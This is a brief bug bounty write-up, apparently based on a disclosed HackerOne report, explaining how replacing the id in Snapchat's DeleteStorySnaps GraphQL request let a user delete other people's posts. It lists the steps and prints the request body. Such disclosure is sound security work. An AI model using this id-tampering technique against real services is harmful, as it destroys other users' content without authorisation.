# Delete anyone's content remotely worth $15,000

1. Go to [https://my.snapchat.com/myposts](https://my.snapchat.com/myposts) and log in there.
2. You will see your posts.
3. Select any of your posts and click delete option.
4. In delete request there is parameter of id:
```
{"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT_STORY"},
"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!)
{\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}
```
5. You just have to change this id parameter.
6. You can easily get the id parameter. Now forward the request after replacing id with someone's else video id.
<br>&nbsp;

## Credit
Based on [prickn9](https://hackerone.com/reports/1819832)'s writeup.
<br>&nbsp;

## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
